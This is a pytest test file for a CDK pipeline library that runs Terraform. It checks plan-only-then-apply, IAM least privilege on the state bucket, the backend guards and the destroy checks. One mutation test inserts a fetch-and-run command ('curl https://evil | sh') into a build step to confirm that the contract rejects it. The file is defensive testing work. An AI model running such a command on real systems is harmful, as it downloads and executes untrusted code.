"""Terraform plan once, check the plan, apply exactly that plan."""

import copy
import json
import pathlib
import shutil
import subprocess

import pytest
from aws_cdk import aws_iam as iam
from aws_cdk.assertions import Template
from test_pipeline import POST, build

from specter_pipeline import Assembly, DeployStep, Ec2, Gate, TerraformRoot
from specter_pipeline import testing as c
from specter_pipeline.compute import EC2_IMAGE
from specter_pipeline.presets import terraform_gates
from specter_pipeline.terraform import (
    apply_commands,
    plan_check_commands,
    plan_commands,
)

REPO = "Specter099/demo"
FIXTURES = pathlib.Path(__file__).parent / "fixtures" / "tfplan"
APPLY_IAM = iam.PolicyStatement(actions=["sqs:CreateQueue"], resources=["arn:aws:sqs:us-east-1:000000000000:app-*"])
PLAN_IAM = iam.PolicyStatement(actions=["sqs:GetQueueAttributes"], resources=["arn:aws:sqs:us-east-1:000000000000:app-*"])
ROOT = TerraformRoot("infra", plan_policy_statements=[PLAN_IAM], apply_policy_statements=[APPLY_IAM])
GATES = terraform_gates(roots=["infra"])


def tf_build(root=ROOT, gates=GATES, **kw):
    return build(application_stage=None, terraform=root, gates=gates, **kw)


@pytest.fixture(scope="module")
def tpl():
    return tf_build()


def actions(t, stage):
    return {a["Name"]: a for a in c._stage(t, stage)["Actions"]}


def reads(action):
    return [i["Name"] for i in action.get("InputArtifacts", [])]


def project(t, step):
    return c._project_of(t, step)


def policies_of(t, step):
    role = project(t, step)["ServiceRole"]["Fn::GetAtt"][0]
    return json.dumps([s for _, s in c._role_policy_statements(t, {role})])


# --- the root ----------------------------------------------------------------------------------


@pytest.mark.parametrize("path", ["/abs", "../up", "a/../b", "", "-rf", "a b"])
def test_root_path_is_validated(path):
    with pytest.raises(ValueError, match="terraform root"):
        TerraformRoot(path)


@pytest.mark.parametrize("kw,err", [({"name": "a b"}, ValueError), ({"allow_destroy": "yes"}, TypeError),
                                    ({"plan_ec2": "small"}, TypeError), ({"var_files": "x.tfvars"}, TypeError),
                                    ({"var_files": ["../secrets.tfvars"]}, ValueError)])
def test_root_settings_are_validated(kw, err):
    with pytest.raises(err):
        TerraformRoot("infra", **kw)


def test_plan_and_apply_default_to_ec2():
    r = TerraformRoot()
    assert (r.plan_ec2, r.apply_ec2) == (Ec2("small", 60), Ec2("small", 120))
    assert r.state_key == "main/terraform.tfstate"


def test_plan_commands():
    cmds = plan_commands(TerraformRoot("infra", var_files=["prod.tfvars"]))
    assert cmds[0] == "cd infra"
    assert cmds[2].startswith("test ! -e errored.tfstate")
    assert "-lockfile=readonly" in cmds[3] and "use_lockfile=true" in cmds[3]
    assert '"bucket=$TF_STATE_BUCKET"' in cmds[3] and "key=main/terraform.tfstate" in cmds[3]
    assert cmds[4].startswith("python3 -I -c") and "TF_STATE_BUCKET" in cmds[4]  # backend guard
    assert cmds[5] == "terraform plan -input=false -no-color -lock-timeout=5m -var-file=prod.tfvars -out=tfplan"
    assert cmds[6] == "terraform show -json tfplan > tfplan.json"
    assert cmds[7] == "terraform show -no-color tfplan > tfplan.txt"
    assert cmds[-1] == "rm -rf .terraform"


def test_apply_is_exactly_the_saved_plan():
    cmds = apply_commands(ROOT)
    assert cmds[-1].startswith("rc=0; terraform apply -input=false -no-color -lock-timeout=5m tfplan || rc=$?")
    assert not any("terraform plan" in x or "-auto-approve" in x or "-replace" in x or "-target" in x for x in cmds)


# --- the destroy check, on real Terraform plans -------------------------------------------------


def _check(fixture, allow, tmp_path):
    shutil.copy(FIXTURES / fixture, tmp_path / "tfplan.json")
    cmd = plan_check_commands(TerraformRoot(".", allow_destroy=allow), ".")[0]
    return subprocess.run(["bash", "-c", cmd], check=False, cwd=tmp_path, capture_output=True, text=True)


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
@pytest.mark.parametrize(
    "fixture,allow,ok,says",
    [
        ("create.json", False, True, "create=1"),
        ("replace.json", False, False, "replace: terraform_data.a"),
        ("replace.json", True, True, "replace=1"),
        ("delete.json", False, False, "delete: terraform_data.b"),
        ("delete.json", True, True, "delete=1"),
    ],
)
def test_destroy_check_on_real_plans(tmp_path, fixture, allow, ok, says):
    r = _check(fixture, allow, tmp_path)
    assert (r.returncode == 0) is ok, r.stdout + r.stderr
    assert says in r.stdout


# --- the pipeline ------------------------------------------------------------------------------


def test_shape(tpl):
    gates, deploy = actions(tpl, "Gates"), actions(tpl, "Deploy")
    (out,) = gates["Plan-main"]["OutputArtifacts"]
    assert reads(gates["Plan-main"]) == ["Specter099_demo_Source"]
    assert reads(gates["Gate-tf-plan-check-main"]) == [out["Name"]]
    assert gates["Gate-tf-plan-check-main"]["RunOrder"] > gates["Plan-main"]["RunOrder"]
    assert reads(deploy["Deploy-main"]) == [out["Name"]], "apply reads the plan, nothing else"
    assert deploy["Approve-Deploy"]["RunOrder"] < deploy["Deploy-main"]["RunOrder"]


def test_plan_and_apply_run_on_ec2_and_the_check_on_lambda(tpl):
    for step, minutes in (("Plan-main", 60), ("Deploy-main", 120)):
        env = project(tpl, step)["Environment"]
        assert (env["Type"], env["Image"]) == ("LINUX_CONTAINER", EC2_IMAGE.image_id)
        assert project(tpl, step)["TimeoutInMinutes"] == minutes
    assert project(tpl, "Gate-tf-plan-check-main")["Environment"]["Type"] == "LINUX_LAMBDA_CONTAINER"


def test_state_bucket(tpl):
    (b,) = [r["Properties"] for r in tpl.find_resources("AWS::S3::Bucket").values()
            if r["Properties"].get("BucketNamePrefix") == "demo-tfstate"]
    assert b["BucketNamespace"] == "account-regional"
    assert b["VersioningConfiguration"]["Status"] == "Enabled"
    assert all("ExpirationInDays" not in rule for rule in b["LifecycleConfiguration"]["Rules"])
    (res,) = [r for r in tpl.find_resources("AWS::S3::Bucket").values()
              if r["Properties"].get("BucketNamePrefix") == "demo-tfstate"]
    assert res["DeletionPolicy"] == "Retain"


def test_who_can_touch_state(tpl):
    plan, apply, check = (policies_of(tpl, s) for s in ("Plan-main", "Deploy-main", "Gate-tf-plan-check-main"))
    assert "TerraformState" not in check
    assert "sqs:GetQueueAttributes" in plan and "sqs:CreateQueue" not in plan
    assert "sqs:CreateQueue" in apply
    c.assert_applies_plan(tpl, ROOT)  # only Deploy may PutObject on the state key


def test_contract_passes(tpl):
    c.assert_standard_contract(tpl, post_deploy=[POST], repo=REPO, gates=GATES, terraform=ROOT)


def test_pr_checks_never_plan_or_reach_state(tpl):
    c.assert_pr_roles_least_privilege(tpl, "demo")
    names = {r["Properties"]["Name"] for r in c.pr_projects(tpl, "demo").values()}
    assert not any("plan" in n for n in names)


def test_deploy_held_closed_by_default(tpl):
    c.assert_deploy_closed(tpl)


@pytest.mark.parametrize(
    "kw,match",
    [
        ({"deploy_step": DeployStep("app", ["./d.sh"])}, "exactly one of"),
        ({"assembly": Assembly()}, "no cloud assembly"),
        ({"gates": [*GATES, Gate("scan", ["ls cdk.out"], uses_assembly=True)]}, "no cloud assembly"),
        ({"gates": [*GATES, Gate("tf-plan-check-main", ["x"])]}, "is the construct's"),
    ],
)
def test_invalid_combinations(kw, match):
    with pytest.raises(ValueError, match=match):
        tf_build(**kw)


# --- the contract rejects each way of not applying the checked plan ----------------------------


def mutated(change):
    doc = copy.deepcopy(tf_build().to_json())
    change(doc["Resources"])
    return Template.from_json(doc)


def _stage_actions(res, stage):
    pipe = next(r for r in res.values() if r["Type"] == "AWS::CodePipeline::Pipeline")
    return {a["Name"]: a for s in pipe["Properties"]["Stages"] if s["Name"] == stage for a in s["Actions"]}


def _project(res, step):
    return next(r["Properties"] for r in res.values() if r["Type"] == "AWS::CodeBuild::Project"
                and str(r["Properties"].get("Description", "")).endswith(f"/{step}"))


def _edit_cmds(step, edit):
    def change(res):
        p = _project(res, step)
        spec = json.loads(p["Source"]["BuildSpec"])
        edit(spec["phases"]["build"]["commands"])
        p["Source"]["BuildSpec"] = json.dumps(spec)
    return change


def _role_policy(res, step):
    role = _project(res, step)["ServiceRole"]["Fn::GetAtt"][0]
    return next(r["Properties"]["PolicyDocument"]["Statement"] for r in res.values()
                if r["Type"] == "AWS::IAM::Policy" and {x["Ref"] for x in r["Properties"]["Roles"]} == {role})


def _state_key_resource(res):
    for st in _role_policy(res, "Deploy-main"):
        if st["Action"] == "s3:PutObject" and "TerraformState" in json.dumps(st["Resource"]):
            return st["Resource"]
    raise AssertionError("no state write found")


@pytest.mark.parametrize(
    "change,message",
    [
        (lambda r: _stage_actions(r, "Deploy")["Deploy-main"].__setitem__(
            "InputArtifacts", [{"Name": "Specter099_demo_Source"}]), "must read the plan artifact only"),
        (_edit_cmds("Deploy-main", lambda cmds: cmds.insert(-1, "terraform plan -out=tfplan")), "runs more or other"),
        (_edit_cmds("Deploy-main", lambda cmds: cmds.__setitem__(-1, "terraform apply -auto-approve")), "runs more or other"),
        (lambda r: _project(r, "Deploy-main")["Environment"].update(
            {"Type": "LINUX_LAMBDA_CONTAINER", "Image": "x"}), "is not on EC2"),
        (lambda r: _project(r, "Plan-main")["Environment"].update(
            {"Type": "LINUX_LAMBDA_CONTAINER", "Image": "x"}), "is not on EC2"),
        (lambda r: _stage_actions(r, "Gates")["Gate-tf-plan-check-main"].__setitem__(
            "InputArtifacts", [{"Name": "Specter099_demo_Source"}]), "does not read exactly the plan"),
        (lambda r: _role_policy(r, "Plan-main").append(
            {"Effect": "Allow", "Action": "s3:PutObject", "Resource": _state_key_resource(r)}), "Plan-main can write"),
        (lambda r: _role_policy(r, "Gate-tf-plan-check-main").append(
            {"Effect": "Allow", "Action": "s3:GetObject", "Resource": _state_key_resource(r)}), "can reach the state bucket"),
    ],
)
def test_assert_applies_plan_rejects(change, message):
    with pytest.raises(AssertionError, match=message):
        c.assert_applies_plan(mutated(change), ROOT)


def test_plan_without_its_pinned_terraform_toolchain_fails_the_contract():
    t = mutated(_edit_cmds("Plan-main", lambda cmds: [cmds.remove(x) for x in list(cmds) if "terraform.zip" in x]))
    with pytest.raises(AssertionError, match="TERRAFORM toolchain"):
        c.assert_standard_contract(t, post_deploy=[POST], repo=REPO, gates=GATES, terraform=ROOT)


# --- hardening from the step 3 review ----------------------------------------------------------

from specter_pipeline.terraform import backend_check


def _backend_file(tmp_path, backend):
    d = tmp_path / ".terraform"
    d.mkdir(exist_ok=True)
    if backend is not None:
        (d / "terraform.tfstate").write_text(json.dumps({"version": 3, "backend": backend}))


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
@pytest.mark.parametrize(
    "backend,ok",
    [
        ({"type": "s3", "config": {"bucket": "B", "key": "main/terraform.tfstate"}}, True),
        (None, False),  # no backend block: Terraform writes no backend file and uses local state
        ({"type": "local", "config": {"path": "x.tfstate"}}, False),
        ({"type": "s3", "config": {"bucket": "other", "key": "main/terraform.tfstate"}}, False),
        ({"type": "s3", "config": {"bucket": "B", "key": "other/terraform.tfstate"}}, False),
        ({"type": "s3", "config": {"bucket": "B", "key": "main/terraform.tfstate", "workspace_key_prefix": "x"}}, False),
    ],
)
def test_backend_guard(tmp_path, backend, ok):
    _backend_file(tmp_path, backend)
    r = subprocess.run(["bash", "-c", backend_check(TerraformRoot())], check=False, cwd=tmp_path,
                       capture_output=True, text=True, env={"PATH": "/usr/bin:/bin", "TF_STATE_BUCKET": "B"})
    assert (r.returncode == 0) is ok, r.stdout + r.stderr


def _fake_terraform(tmp_path, apply_rc, errored):
    bin_ = tmp_path / "bin"
    bin_.mkdir(exist_ok=True)
    log = tmp_path / "calls"
    (bin_ / "terraform").write_text(
        "#!/bin/sh\n"
        f'echo "$@" >> {log}\n'
        f'if [ "$1" = apply ]; then {"touch errored.tfstate;" if errored else ""} exit {apply_rc}; fi\n'
        "exit 0\n"
    )
    (bin_ / "terraform").chmod(0o755)
    return bin_, log


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
@pytest.mark.parametrize("apply_rc,errored,ok,pushed", [(0, False, True, False), (1, False, False, False), (1, True, False, True)])
def test_apply_wrapper_pushes_errored_state_and_fails(tmp_path, apply_rc, errored, ok, pushed):
    bin_, log = _fake_terraform(tmp_path, apply_rc, errored)
    cmd = apply_commands(ROOT)[-1]
    r = subprocess.run(["bash", "-c", cmd], check=False, cwd=tmp_path, capture_output=True, text=True,
                       env={"PATH": f"{bin_}:/usr/bin:/bin"})
    assert (r.returncode == 0) is ok, r.stdout + r.stderr
    assert ("state push errored.tfstate" in log.read_text()) is pushed
    if not ok:
        assert "release again" in r.stdout


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
@pytest.mark.parametrize(
    "fixture,ok,says",
    [
        ("create_before_destroy.json", False, "replace: terraform_data.a"),
        ("forget.json", True, "FORGET (removed from state, left running): terraform_data.keep"),
    ],
)
def test_destroy_check_on_more_real_plans(tmp_path, fixture, ok, says):
    r = _check(fixture, False, tmp_path)
    assert (r.returncode == 0) is ok, r.stdout + r.stderr
    assert says in r.stdout


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
@pytest.mark.parametrize("doc", ["{}", '{"resource_changes": []}', "[]"])
def test_destroy_check_refuses_what_is_not_a_plan(tmp_path, doc):
    (tmp_path / "tfplan.json").write_text(doc)
    cmd = plan_check_commands(TerraformRoot("."), ".")[0]
    r = subprocess.run(["bash", "-c", cmd], check=False, cwd=tmp_path, capture_output=True, text=True)
    assert r.returncode != 0


@pytest.mark.parametrize("key", ["TF_CLI_ARGS", "TF_CLI_ARGS_apply", "TF_WORKSPACE", "TF_DATA_DIR",
                                 "TF_STATE_BUCKET", "TF_CLI_CONFIG_FILE"])
def test_env_that_steers_terraform_is_refused(key):
    with pytest.raises(ValueError, match="env may not set"):
        TerraformRoot("infra", env={key: "x"})


def test_lock_delete_markers_expire(tpl):
    (b,) = [r["Properties"] for r in tpl.find_resources("AWS::S3::Bucket").values()
            if r["Properties"].get("BucketNamePrefix") == "demo-tfstate"]
    assert any(r.get("ExpiredObjectDeleteMarker") for r in b["LifecycleConfiguration"]["Rules"])
    c.assert_state_bucket(tpl, "demo")


def test_list_bucket_has_no_prefix_condition(tpl):
    for step in ("Plan-main", "Deploy-main"):
        stmts = json.loads(policies_of(tpl, step))
        lists = [s for s in stmts if s["Action"] == "s3:ListBucket" and "TerraformState" in json.dumps(s)]
        assert lists and all("Condition" not in s for s in lists)


def _bucket(res):
    return next(r for r in res.values() if r["Type"] == "AWS::S3::Bucket"
                and r["Properties"].get("BucketNamePrefix") == "demo-tfstate")


def _bucket_policy(res):
    lid = next(k for k, r in res.items() if r["Type"] == "AWS::S3::Bucket"
               and r["Properties"].get("BucketNamePrefix") == "demo-tfstate")
    return next(r for r in res.values() if r["Type"] == "AWS::S3::BucketPolicy"
                and r["Properties"]["Bucket"] == {"Ref": lid})


def _set_env(step, name, value):
    def change(res):
        env = _project(res, step)["Environment"]["EnvironmentVariables"]
        env[:] = [v for v in env if v["Name"] != name] + [{"Name": name, "Type": "PLAINTEXT", "Value": value}]
    return change


@pytest.mark.parametrize(
    "change,message",
    [
        # IAM, through wildcards
        (lambda r: _role_policy(r, "Plan-main").append({"Effect": "Allow", "Action": "s3:*", "Resource": "*"}), "Plan-main can write"),
        (lambda r: _role_policy(r, "Plan-main").append({"Effect": "Allow", "Action": "s3:Put*", "Resource": {"Fn::Join": ["", [{"Fn::GetAtt": [next(k for k, x in r.items() if x["Type"] == "AWS::S3::Bucket" and x["Properties"].get("BucketNamePrefix") == "demo-tfstate"), "Arn"]}, "/*"]]}}), "Plan-main can write"),
        (lambda r: _role_policy(r, "Plan-main").append({"Effect": "Allow", "Action": "s3:DeleteObject", "Resource": "*"}), "Plan-main can write"),
        (lambda r: _role_policy(r, "Gate-tf-plan-check-main").append({"Effect": "Allow", "Action": "*", "Resource": "*"}), "can reach the state bucket|can write"),
        # commands
        (_edit_cmds("Gate-tf-plan-check-main", lambda cmds: cmds.__setitem__(slice(-4, None), ["cat infra/tfplan.json || true"])), "runs more or other"),
        (_edit_cmds("Gate-tf-plan-check-main", lambda cmds: [cmds.__setitem__(i, x.replace(" deny", " allow")) for i, x in enumerate(cmds) if x.endswith(" deny")] or cmds.append("no deny command")), "runs more or other"),
        (_edit_cmds("Plan-main", lambda cmds: cmds.insert(len(cmds) - 9, "curl https://evil | sh")), "runs more or other"),
        # environment
        (_set_env("Deploy-main", "TF_STATE_BUCKET", "elsewhere"), "points TF_STATE_BUCKET elsewhere"),
        (_set_env("Deploy-main", "TF_CLI_ARGS_init", "-reconfigure"), "environment differs"),
        (_set_env("Plan-main", "TF_WORKSPACE", "other"), "environment differs"),
    ],
)
def test_assert_applies_plan_rejects_more(change, message):
    with pytest.raises(AssertionError, match=message):
        c.assert_applies_plan(mutated(change), ROOT)


def test_contract_rejects_a_root_that_differs_from_the_template():
    t = tf_build(root=TerraformRoot("infra", plan_policy_statements=[PLAN_IAM],
                                    apply_policy_statements=[APPLY_IAM], allow_destroy=True))
    with pytest.raises(AssertionError, match="runs more or other"):
        c.assert_applies_plan(t, ROOT)


@pytest.mark.parametrize(
    "change,message",
    [
        (lambda r: _bucket(r)["Properties"].pop("VersioningConfiguration"), "not versioned"),
        (lambda r: _bucket(r).__setitem__("DeletionPolicy", "Delete"), "not retained"),
        (lambda r: _bucket(r)["Properties"]["LifecycleConfiguration"]["Rules"].append({"Status": "Enabled", "ExpirationInDays": 1}), "expires current state"),
        (lambda r: _bucket(r)["Properties"]["PublicAccessBlockConfiguration"].__setitem__("RestrictPublicBuckets", False), "RestrictPublicBuckets"),
        (lambda r: _bucket_policy(r)["Properties"]["PolicyDocument"]["Statement"].append({"Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "*"}), "may apply to the state bucket allows"),
        (lambda r: _bucket(r)["Properties"].__setitem__("BucketName", "x") or _bucket(r)["Properties"].pop("BucketNamePrefix"), "expected one Terraform state bucket"),
    ],
)
def test_assert_state_bucket_rejects(change, message):
    with pytest.raises(AssertionError, match=message):
        c.assert_state_bucket(mutated(change), "demo")


# --- second verification round ------------------------------------------------------------------


def _contract(t, root=ROOT):
    c.assert_standard_contract(t, post_deploy=[POST], repo=REPO, gates=GATES, terraform=root)


@pytest.mark.parametrize(
    "stmt",
    [
        iam.PolicyStatement(actions=["s3:*"], resources=["arn:aws:s3:::*"]),
        iam.PolicyStatement(actions=["s3:PutObject", "s3:DeleteObject"], resources=["arn:aws:s3:::*/*"]),
        iam.PolicyStatement(actions=["s3:PutObject"], resources=["arn:aws:s3:::demo-tfstate-*/*"]),
        iam.PolicyStatement(actions=["s3:putobject"], resources=["*"]),
        iam.PolicyStatement(actions=["S3:*"], resources=["*"]),
    ],
    ids=["s3-star-any-bucket", "any-object", "tfstate-prefix", "lowercase-action", "uppercase-service"],
)
def test_a_plan_role_that_could_write_state_fails_through_the_public_api(stmt):
    root = TerraformRoot("infra", plan_policy_statements=[stmt], apply_policy_statements=[APPLY_IAM])
    with pytest.raises(AssertionError, match="Plan-main can write the Terraform state"):
        _contract(tf_build(root=root), root)


def test_a_broad_read_only_plan_role_is_valid():
    root = TerraformRoot("infra", plan_policy_statements=[
        iam.PolicyStatement(actions=["s3:Get*", "s3:List*", "ec2:Describe*"], resources=["*"])
    ], apply_policy_statements=[APPLY_IAM])
    _contract(tf_build(root=root), root)


def _sub_bucket_write(res):
    lid = next(k for k, x in res.items() if x["Type"] == "AWS::S3::Bucket"
               and x["Properties"].get("BucketNamePrefix") == "demo-tfstate")
    _role_policy(res, "Plan-main").append(
        {"Effect": "Allow", "Action": "s3:PutObject", "Resource": {"Fn::Sub": "${" + lid + ".Arn}/*"}})


def _other_role_writes(res):
    _role_policy(res, "Gate-tf-validate").append(
        {"Effect": "Allow", "Action": "s3:PutObject", "Resource": _state_key_resource(res)})


def _action_env(step, stage):
    def change(res):
        _stage_actions(res, stage)[step]["Configuration"]["EnvironmentVariables"] = json.dumps(
            [{"name": "TF_WORKSPACE", "value": "x", "type": "PLAINTEXT"}])
    return change


@pytest.mark.parametrize(
    "change,message",
    [
        (_sub_bucket_write, "Plan-main can write"),  # an unrecognised intrinsic fails closed
        (_other_role_writes, "Gate-tf-validate can write"),
        (_action_env("Plan-main", "Gates"), "action-level environment"),
        (_action_env("Deploy-main", "Deploy"), "action-level environment"),
        (lambda r: _stage_actions(r, "Gates")["Plan-main"].__setitem__("InputArtifacts", [{"Name": "Synth_Output"}]), "not the source checkout"),
        (lambda r: _project(r, "Gate-tf-plan-check-main")["Environment"]["EnvironmentVariables"].append({"Name": "X", "Type": "PLAINTEXT", "Value": "1"}), "besides CI=true"),
    ],
)
def test_assert_applies_plan_rejects_round_two(change, message):
    with pytest.raises(AssertionError, match=message):
        c.assert_applies_plan(mutated(change), ROOT)


@pytest.mark.parametrize(
    "change,message",
    [
        (lambda r: [r.pop(k) for k in [k for k, x in r.items() if x["Type"] == "AWS::S3::BucketPolicy"
                                        and x["Properties"]["Bucket"] == {"Ref": next(b for b, y in r.items() if y["Type"] == "AWS::S3::Bucket" and y["Properties"].get("BucketNamePrefix") == "demo-tfstate")}]], "no TLS-only deny"),
        (lambda r: _bucket(r)["Properties"]["LifecycleConfiguration"]["Rules"][0]["NoncurrentVersionExpiration"].__setitem__("NoncurrentDays", 1), "keep at least 30"),
        (lambda r: _bucket(r).__setitem__("UpdateReplacePolicy", "Delete"), "retained on replacement"),
        (lambda r: r.__setitem__("Sneaky", {"Type": "AWS::S3::BucketPolicy", "Properties": {
            "Bucket": {"Fn::Sub": "${x}"}, "PolicyDocument": {"Statement": [{"Effect": "Allow", "Principal": "*", "Action": "s3:*", "Resource": "*"}]}}}), "may apply to the state bucket allows"),
    ],
)
def test_assert_state_bucket_rejects_round_two(change, message):
    with pytest.raises(AssertionError, match=message):
        c.assert_state_bucket(mutated(change), "demo")


def test_the_plan_check_reads_inline_checkov_skips_from_the_checkout():
    cmds = plan_check_commands(ROOT, "infra")
    assert any("--repo-root-for-plan-enrichment infra" in x for x in cmds)


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
def test_plan_refuses_a_committed_errored_state(tmp_path):
    (tmp_path / "errored.tfstate").write_text("{}")
    cmd = plan_commands(TerraformRoot("."))[2]
    r = subprocess.run(["bash", "-c", cmd], check=False, cwd=tmp_path, capture_output=True, text=True)
    assert r.returncode != 0 and "errored.tfstate is committed" in r.stdout


def test_deploy_removes_any_errored_state_before_applying():
    cmds = apply_commands(ROOT)
    assert cmds.index("rm -f errored.tfstate") == len(cmds) - 2


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
def test_backend_guard_explains_a_missing_backend(tmp_path):
    r = subprocess.run(["bash", "-c", backend_check(TerraformRoot())], check=False, cwd=tmp_path,
                       capture_output=True, text=True, env={"PATH": "/usr/bin:/bin", "TF_STATE_BUCKET": "B"})
    assert r.returncode != 0 and "configured no backend" in r.stdout and "Traceback" not in r.stderr


# --- step 3, round 4: lenient sweep over every principal, literal ARNs, bucket checks -----------


def _state_lid(res):
    return next(k for k, r in res.items() if r["Type"] == "AWS::S3::Bucket"
                and r["Properties"].get("BucketNamePrefix") == "demo-tfstate")


def _add(res, lid, cfn, props):
    res[lid] = {"Type": cfn, "Properties": props}


def _other_role(res, **props):
    trust = {"Version": "2012-10-17", "Statement": [
        {"Effect": "Allow", "Principal": {"Service": "lambda.amazonaws.com"}, "Action": "sts:AssumeRole"}]}
    _add(res, "OtherRole", "AWS::IAM::Role", {"AssumeRolePolicyDocument": trust, **props})


def _doc(*stmts):
    return {"Version": "2012-10-17", "Statement": list(stmts)}


def _put(resource, **extra):
    return {"Effect": "Allow", "Action": "s3:PutObject", "Resource": resource, **extra}


def test_an_unrelated_role_with_aws_managed_policies_passes():
    def change(res):
        _other_role(res, ManagedPolicyArns=["arn:aws:iam::aws:policy/ReadOnlyAccess"])
    c.assert_applies_plan(mutated(change), ROOT)


def test_an_unrelated_role_writing_state_through_an_import_passes():
    def change(res):
        _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(
            _put({"Fn::Join": ["", [{"Fn::ImportValue": "OtherBucketArn"}, "/*"]]}))}])
    c.assert_applies_plan(mutated(change), ROOT)


@pytest.mark.parametrize(
    "attach",
    [
        # a managed policy in this template, attached either way round
        lambda res, st: (_other_role(res, ManagedPolicyArns=[{"Ref": "MP"}]),
                         _add(res, "MP", "AWS::IAM::ManagedPolicy", {"PolicyDocument": _doc(st)})),
        lambda res, st: (_other_role(res),
                         _add(res, "MP", "AWS::IAM::ManagedPolicy",
                              {"PolicyDocument": _doc(st), "Roles": [{"Ref": "OtherRole"}]})),
        # users and groups
        lambda res, st: (_add(res, "U", "AWS::IAM::User", {}),
                         _add(res, "UP", "AWS::IAM::Policy", {"PolicyName": "p", "PolicyDocument": _doc(st),
                                                              "Users": [{"Ref": "U"}]})),
        lambda res, st: _add(res, "G", "AWS::IAM::Group", {"Policies": [{"PolicyName": "p", "PolicyDocument": _doc(st)}]}),
    ],
    ids=["managed-by-ref", "managed-roles", "user", "group"],
)
def test_any_principal_that_can_write_state_fails(attach):
    def change(res):
        attach(res, _put({"Fn::Join": ["", [{"Fn::GetAtt": [_state_lid(res), "Arn"]}, "/*"]]}))
    with pytest.raises(AssertionError, match="can write the Terraform state"):
        c.assert_applies_plan(mutated(change), ROOT)


@pytest.mark.parametrize(
    "stmt",
    [
        {"Effect": "Allow", "NotAction": "iam:*", "Resource": "*"},
        {"Effect": "Allow", "Action": "s3:*", "NotResource": "arn:aws:s3:::somewhere-else/*"},
        _put("arn:aws:s3:::demo-tfstate-123456789012-eu-west-2-an/*"),
        _put("arn:aws-us-gov:s3:::demo-tfstate-*/main/*"),
        _put("arn:*:s3:::demo-tfstate-*"),  # IAM's * also matches "/", so this reaches objects
    ],
    ids=["not-action", "not-resource", "literal-other-account", "gov-partition", "star-spans-slash"],
)
def test_hand_written_state_access_on_another_role_is_caught(stmt):
    def change(res):
        _other_role(res, Policies=[{"PolicyName": "p", "PolicyDocument": _doc(stmt)}])
    with pytest.raises(AssertionError, match="OtherRole can write the Terraform state"):
        c.assert_applies_plan(mutated(change), ROOT)


def test_a_join_of_partition_and_bucket_ref_is_caught():
    def change(res):
        _role_policy(res, "Plan-main").append(_put({"Fn::Join": ["", [
            "arn:", {"Ref": "AWS::Partition"}, ":s3:::", {"Ref": _state_lid(res)}, "/*"]]}))
    with pytest.raises(AssertionError, match="Plan-main can write"):
        c.assert_applies_plan(mutated(change), ROOT)


def test_the_plan_role_may_not_carry_managed_policies():
    def change(res):
        role = _project(res, "Plan-main")["ServiceRole"]["Fn::GetAtt"][0]
        res[role]["Properties"]["ManagedPolicyArns"] = ["arn:aws:iam::aws:policy/ReadOnlyAccess"]
    with pytest.raises(AssertionError, match="managed policies"):
        c.assert_applies_plan(mutated(change), ROOT)


def _bucket_policy_statements(res):
    pol = next(r for r in res.values() if r["Type"] == "AWS::S3::BucketPolicy"
               and r["Properties"]["Bucket"] == {"Ref": _state_lid(res)})
    return pol["Properties"]["PolicyDocument"]["Statement"]


@pytest.mark.parametrize(
    "change,message",
    [
        (lambda r: r[_state_lid(r)]["Properties"]["LifecycleConfiguration"]["Rules"].append(
            {"Status": "Enabled", "NoncurrentVersionExpirationInDays": 1}), "expire after 1 days"),
        (lambda r: [st.__setitem__("Condition", {"Bool": {"aws:SecureTransport": "true"}})
                    for st in _bucket_policy_statements(r)], "no TLS-only deny"),
        (lambda r: [st.__setitem__("Action", "s3:GetObject") for st in _bucket_policy_statements(r)],
         "no TLS-only deny"),
    ],
    ids=["legacy-lifecycle", "tls-condition-inverted", "tls-deny-narrowed"],
)
def test_assert_state_bucket_rejects_weakened_policies(change, message):
    with pytest.raises(AssertionError, match=message):
        c.assert_state_bucket(mutated(change), "demo")


def test_a_tls_deny_on_another_bucket_does_not_count():
    def change(res):
        stmts = _bucket_policy_statements(res)
        stmts[:] = [s for s in stmts if "aws:SecureTransport" not in json.dumps(s)]
        _add(res, "B2Policy", "AWS::S3::BucketPolicy", {"Bucket": "elsewhere", "PolicyDocument": _doc(
            {"Effect": "Deny", "Principal": {"AWS": "*"}, "Action": "s3:*", "Resource": "*",
             "Condition": {"Bool": {"aws:SecureTransport": "false"}}})})
    with pytest.raises(AssertionError, match="no TLS-only deny"):
        c.assert_state_bucket(mutated(change), "demo")


def test_resources_without_properties_do_not_crash_the_contract():
    def change(res):
        res["Bare"] = {"Type": "AWS::S3::Bucket"}
        res["BareRole"] = {"Type": "AWS::IAM::Role"}
    t = mutated(change)
    c.assert_state_bucket(t, "demo")
    c.assert_applies_plan(t, ROOT)


# --- step 3, round 5: name normalisation, every way IAM can attach, wildcard segments ---------


@pytest.mark.parametrize("repo", ["Specter099/Demo-App", "Specter099/my.site", "Specter099/Post-office"])
def test_the_contract_normalises_the_repo_name_like_the_construct(repo):
    t = tf_build(repo=repo)
    c.assert_standard_contract(t, post_deploy=[POST], repo=repo, gates=GATES, terraform=ROOT)


def _state_object(res):
    return {"Fn::Join": ["", [{"Fn::GetAtt": [_state_lid(res), "Arn"]}, "/*"]]}


@pytest.mark.parametrize(
    "attach",
    [
        lambda res, st: (_other_role(res), _add(res, "RP", "AWS::IAM::RolePolicy", {
            "RoleName": {"Ref": "OtherRole"}, "PolicyName": "p", "PolicyDocument": _doc(st)})),
        lambda res, st: _add(res, "UP", "AWS::IAM::UserPolicy", {
            "UserName": "someone-elsewhere", "PolicyName": "p", "PolicyDocument": _doc(st)}),
        lambda res, st: (_other_role(res, RoleName="other"), _add(res, "P", "AWS::IAM::Policy", {
            "PolicyName": "p", "PolicyDocument": _doc(st), "Roles": ["other"]})),
        lambda res, st: (_other_role(res), _add(res, "P", "AWS::IAM::Policy", {
            "PolicyName": "p", "PolicyDocument": _doc(st), "Roles": [{"Fn::Sub": "${OtherRole}"}]})),
        lambda res, st: (_other_role(res, ManagedPolicyArns=[{"Fn::GetAtt": ["MP", "PolicyArn"]}]),
